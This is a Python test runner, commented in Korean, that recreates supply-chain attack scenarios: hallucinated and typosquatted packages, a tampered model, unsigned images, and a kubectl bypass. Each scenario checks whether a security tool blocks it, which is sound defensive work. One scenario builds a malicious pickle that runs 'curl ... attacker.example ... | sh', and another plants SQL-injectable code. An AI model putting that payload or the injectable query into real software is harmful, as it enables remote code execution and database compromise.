"""공급망 공격 시연 시나리오 실행기 (개발기획서 3-5).

    python scenarios/run_all.py            # PyPI 등 실제 외부 API 사용
    python scenarios/run_all.py --offline  # 기록된 메타데이터 픽스처 사용 (CI·오프라인)

로컬에서 재현하는 시나리오(1~5)는 임시 프로젝트를 만들어 공격을 재현하고, 어느 단계에서 차단되는지 확인한다.
시나리오 6·7 은 레지스트리·클러스터가 필요하므로 --image / --cluster 옵션이 있을 때만 실제로 실행한다.
"""

from __future__ import annotations

import argparse
import json
import os
import pickle
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent / "src"))

from trustchain.bom.aibom import generate_aibom, verify_aibom  # noqa: E402
from trustchain.core.config import Config, ProvenancePolicy  # noqa: E402
from trustchain.packages.checker import PackageChecker  # noqa: E402
from trustchain.packages.pypi import PackageMeta  # noqa: E402
from trustchain.scan.gate import make_checker, run_gate  # noqa: E402

NOW = datetime.now(timezone.utc)


@dataclass
class Result:
    no: int
    title: str
    expected_stage: str
    blocked: bool | None  # None = 건너뜀
    evidence: str


class FixturePyPI:
    """scenarios/fixtures/pypi_meta.json 에 기록한 메타데이터 (오프라인 재현용)."""

    def __init__(self, path: Path):
        raw = json.loads(path.read_text(encoding="utf-8"))
        self.metas = {}
        for name, m in raw.items():
            self.metas[name] = PackageMeta(
                name=name, exists=m["exists"], latest_version=m.get("latest_version"),
                first_release=NOW - timedelta(days=m["age_days"]) if m.get("age_days") is not None else None,
                last_release=NOW - timedelta(days=m.get("last_release_days", 30)) if m["exists"] else None,
                release_count=m.get("release_count", 0), maintainer_count=m.get("maintainer_count", 0),
                description_len=m.get("description_len", 0), has_wheel=m.get("has_wheel", True),
                repository=m.get("repository"))

    def get(self, name: str) -> PackageMeta:
        return self.metas.get(name) or PackageMeta(name=name, exists=False)


def checker_for(cfg: Config, offline: bool) -> PackageChecker:
    if offline:
        return PackageChecker(cfg, FixturePyPI(HERE / "fixtures" / "pypi_meta.json"))
    return make_checker(cfg)


def project(tmp: Path, files: dict[str, str | bytes]) -> Config:
    for rel, content in files.items():
        p = tmp / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(content, encoding="utf-8")
    return Config(root=tmp)


BASE_APP = "from fastapi import FastAPI\nimport numpy\napp = FastAPI()\n"
BASE_REQ = "fastapi==0.115.6\nnumpy==1.26.4\n"


def s1(tmp: Path, offline: bool) -> Result:
    """AI 가 제안한 존재하지 않는 패키지를 requirements.txt 에 추가."""
    cfg = project(tmp, {"requirements.txt": BASE_REQ + "fastapi-auth-shield==1.2.0\n",
                        "app.py": BASE_APP + "import fastapi_auth_shield\n"})
    out = run_gate(cfg, stages={"packages"}, checker=checker_for(cfg, offline), external_tools=False)
    hit = [f for f in out.report.findings if f.rule_id == "TC-PKG-001"]
    return Result(1, "AI 환각 패키지 추가", "개발 단계 (F2)", not out.passed,
                  hit[0].message[:120] if hit else "; ".join(out.violations))


def s2(tmp: Path, offline: bool) -> Result:
    """유명 패키지와 이름이 비슷한 위장 패키지 설치."""
    cfg = project(tmp, {"requirements.txt": BASE_REQ + "reqeusts==2.31.0\n", "app.py": BASE_APP})
    out = run_gate(cfg, stages={"packages"}, checker=checker_for(cfg, offline), external_tools=False)
    v = next((v for v in out.verdicts if v.name == "reqeusts"), None)
    return Result(2, "타이포스쿼팅 패키지 설치", "개발 단계 (F3)", not out.passed,
                  f"reqeusts → {v.verdict} ({'; '.join(v.reasons[:2])})" if v else "")


def s3(tmp: Path, offline: bool) -> Result:
    """SQL 삽입·하드코딩된 비밀정보가 포함된 코드 커밋."""
    code = ('import sqlite3\nDB_PASSWORD = "Pr0d-Passw0rd!"\n'
            'def find(uid):\n    cur = sqlite3.connect("x.db").cursor()\n'
            '    cur.execute("SELECT * FROM users WHERE id = " + uid)\n')
    cfg = project(tmp, {"service.py": code})
    out = run_gate(cfg, stages={"code"}, external_tools=False)
    rules = sorted({f.rule_id for f in out.report.findings})
    # 커밋 차단 기준: HIGH 이상 → 정책 max_high=0 으로 pre-commit 수준 적용
    cfg.gate.max_high = 0
    out = run_gate(cfg, stages={"code"}, external_tools=False)
    return Result(3, "SQL 삽입·하드코딩 비밀정보 커밋", "개발 단계 (F1)", not out.passed, ", ".join(rules))


class _Evil:
    def __reduce__(self):
        return (os.system, ("curl -s http://attacker.example/x | sh",))


def s4(tmp: Path, offline: bool) -> Result:
    """악성 코드를 심은 pickle 모델 파일로 교체."""
    legit = tmp / "model" / "model.pkl"
    cfg = project(tmp, {"model/model.pkl": pickle.dumps({"weights": [0.1, 0.2]}),
                        "models.toml": '[[model]]\nname="clf"\nversion="1"\npath="model/model.pkl"\n'})
    aibom = generate_aibom(tmp, ["model"], [], "demo")
    legit.write_bytes(pickle.dumps(_Evil()))  # 공격자가 모델을 교체
    out = run_gate(cfg, stages={"models"}, external_tools=False)
    hashes = verify_aibom(aibom, tmp)
    ev = [f.message[:100] for f in out.report.findings if f.rule_id == "TC-MODEL-001"]
    ev += [f"AI-BOM: {c.reason}" for c in hashes if not c.ok]
    return Result(4, "악성 pickle 모델로 교체", "빌드 단계 (F5)", not out.passed, " / ".join(ev))


def s5(tmp: Path, offline: bool, image: str | None) -> Result:
    """취약한 OS 패키지가 포함된 베이스 이미지 사용."""
    cfg = project(tmp, {"Dockerfile": "FROM registry.example/base:vulnerable\nRUN apt-get update && apt-get install -y xz-utils\n"})
    trivy = HERE / "fixtures" / "trivy_sample.json"
    source = "시연용 샘플 Trivy 리포트"
    if image and shutil.which("trivy"):
        subprocess.run(["trivy", "image", "--quiet", "--format", "json", "-o", str(tmp / "trivy.json"), image],
                       check=False)
        trivy, source = tmp / "trivy.json", f"trivy image {image}"
    out = run_gate(cfg, stages={"image", "docker"}, trivy_report=trivy, image=image or "sample",
                   external_tools=False)
    crit = [f.rule_id for f in out.report.findings if f.category == "image" and f.severity.value == "CRITICAL"]
    ids = list(dict.fromkeys(crit))  # 같은 CVE 가 여러 OS 패키지에서 나오면 한 번만 표시
    return Result(5, "취약 OS 패키지 베이스 이미지", "빌드 단계 (F5)", not out.passed,
                  f"{source}: CRITICAL {len(crit)}건 (항목 {len(ids)}종) {ids[:3]}")


def s6(image: str | None, repo: str | None) -> Result:
    """개발자 PC 에서 빌드한 서명 없는 이미지를 레지스트리에 직접 업로드."""
    if not image or not shutil.which("cosign"):
        return Result(6, "서명 없는 이미지 직접 업로드", "배포 단계 (F8)", None,
                      "건너뜀: --image <registry/repo@sha256:...> 와 cosign 필요 (docs/scenarios.md)")
    from trustchain.attest.verify import VerifyGate

    pol = ProvenancePolicy(source_repo=repo or "github.com/kswkm/TrustChain-AI",
                           workflow_path=".github/workflows/trustchain-ci.yml")
    res = VerifyGate(pol).verify(image)
    failed = [f"{c.name}: {c.detail[:60]}" for c in res.checks if not c.passed]
    return Result(6, "서명 없는 이미지 직접 업로드", "배포 단계 (F8)", not res.passed, "; ".join(failed))


def s7(cluster: bool, image: str | None) -> Result:
    """검증 절차를 우회해 kubectl 로 이미지를 직접 배포."""
    if not cluster or not image or not shutil.which("kubectl"):
        return Result(7, "kubectl 직접 배포 우회", "배포 단계 (F9)", None,
                      "건너뜀: --cluster --image 와 Kyverno 설치 클러스터 필요 (docs/scenarios.md)")
    r = subprocess.run(["kubectl", "-n", "app", "run", "bypass-test", f"--image={image}", "--restart=Never"],
                       capture_output=True, text=True, check=False)
    blocked = r.returncode != 0 and ("trustchain-verify-images" in r.stderr or "admission webhook" in r.stderr)
    return Result(7, "kubectl 직접 배포 우회", "배포 단계 (F9)", blocked, (r.stderr or r.stdout).strip()[:160])


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--offline", action="store_true")
    ap.add_argument("--image", help="시나리오 6·7 에 사용할 실제 이미지 (서명 없는 이미지 digest). --vuln-image 가 없으면 5 에도 사용")
    ap.add_argument("--vuln-image", help="시나리오 5 에서 trivy 로 실제 스캔할 베이스 이미지 (예: 지원 종료된 OS 기반 이미지)")
    ap.add_argument("--repo")
    ap.add_argument("--cluster", action="store_true")
    ap.add_argument("-o", "--output")
    args = ap.parse_args()
    for s in (sys.stdout, sys.stderr):
        try:
            s.reconfigure(encoding="utf-8")  # type: ignore[attr-defined]
        except (AttributeError, ValueError):
            pass
    results: list[Result] = []
    for fn in (s1, s2, s3, s4):
        with tempfile.TemporaryDirectory() as d:
            results.append(fn(Path(d), args.offline))
    with tempfile.TemporaryDirectory() as d:
        results.append(s5(Path(d), args.offline, args.vuln_image or args.image))
    results.append(s6(args.image, args.repo))
    results.append(s7(args.cluster, args.image))

    print(f"{'#':<3}{'공격 시나리오':<28}{'차단 단계':<16}결과")
    for r in results:
        state = "SKIP" if r.blocked is None else ("차단" if r.blocked else "미차단")
        print(f"{r.no:<3}{r.title:<28}{r.expected_stage:<16}{state}  {r.evidence}")
    ran = [r for r in results if r.blocked is not None]
    ok = all(r.blocked for r in ran)
    print(f"\n실행 {len(ran)}종 중 차단 {sum(1 for r in ran if r.blocked)}종, 건너뜀 {len(results) - len(ran)}종")
    if args.output:
        Path(args.output).write_text(json.dumps([r.__dict__ for r in results], ensure_ascii=False, indent=2),
                                     encoding="utf-8")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
